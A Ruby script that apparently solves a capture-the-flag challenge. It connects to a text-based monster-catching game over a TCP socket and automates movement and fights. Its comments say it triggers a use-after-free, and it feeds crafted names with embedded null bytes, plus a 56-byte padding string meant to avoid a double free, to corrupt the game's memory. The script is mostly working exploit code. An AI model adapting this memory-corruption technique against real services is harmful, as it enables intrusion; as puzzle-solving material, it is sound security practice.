require 'socket'

S = TCPSocket.new(ARGV[0] || 'localhost', ARGV[1] || 6666)

STATE = {
  fighting: 1,
  last_fought: "",
  delay: 0.08
}

def c(command)
  puts(command)
  S.write("#{ command }\n")
  sleep(STATE[:delay])
end

def recv_loop()
  loop do
    str = S.recv(1024)

    # Detect fights ending
    if str =~ /The enemy's (.*) faints/
      STATE[:fighting] = 0
      STATE[:last_fought] = $1
    end

    if str =~ /You got away/
      STATE[:fighting] = 0
    end

    print(str)
  end
end

def up(n)
  1.upto(n) do
    c("w")
  end
end

def left(n)
  1.upto(n) do
    c("a")
  end
end

def down(n)
  1.upto(n) do
    c("s")
  end
end

def right(n)
  1.upto(n) do
    c("d")
  end
end

def fight_attack(replace = "n")
  STATE[:fighting] = 1

  # Start a fight
  c("fight")

  # "Press enter to continue
  c("")

  while STATE[:fighting] == 1
    c("attack")
    c("")
  end

  c(replace)
end

def fight_run()
  STATE[:fighting] = 1

  # Start a fight
  c("fight")

  # "Press enter to continue
  c("")

  while STATE[:fighting] == 1
    c("run")
    c("")
  end
end

def change_name(name)
  left(1)
  c("")
  c("")
  c(name)
  c("")
end

Thread.new do
  # Name
  c("Ron")

  # Starter
  c("Fire")
  c("y") # Confirm

  # Turn on encounter table
  c("encounters show")

  # First off, we need to see #10 (caterpillar) naturally
  c("fly colour")
  right(1)
  up(6)

  # Fight the caterpillar, but don't capture it
  fight_attack("n")

  # Fly to nearest city to name changer
  c("fly deepblue")

  up(2)
  right(9)
  down(4)
  left(1)

  # Fight and capture a Pony
  fight_attack("y")

  # Fight and capture Siamese Cat (this triggers the use-after-free)
  fight_attack("y")

  1.upto(151) do |i|
    # Don't capture 10 (newline is bad, we already got caterpie)
    if i == 10
      next
    end

    # Don't catch 146, that's us
    if i == 146
      next
    end

    # Change names
    change_name(i.chr + "\0\0\0Hi!\0")

    # Fight and run
    loop do
      STATE[:last_fought] = ""

      fight_run()
      if STATE[:last_fought] == 'Hi!'
        # We need an extra newline, because the enemy unexpectedly dies
        c("")
        break
      end
    end

    puts "Got #{ i }!"
    sleep(1)

    # Change name a second time (this is the "off" tick)
    change_name("Anything goes here")
  end

  # This is required to avoid crashing with a double free
  change_name("A" * 56)

  # Go to ron's to verify
  # c("fly gray")
  # down(4)
  # c("fly deepblue")
  # right(6)
  # down(1)
  # right(12)
  # up(4)

  # Talk to the professor
  c("fly gray")
  down(4)
  c("fly colour")
  right(10)
  up(3)

  loop do
    sleep(2)
    c("")
  end
end

recv_loop()
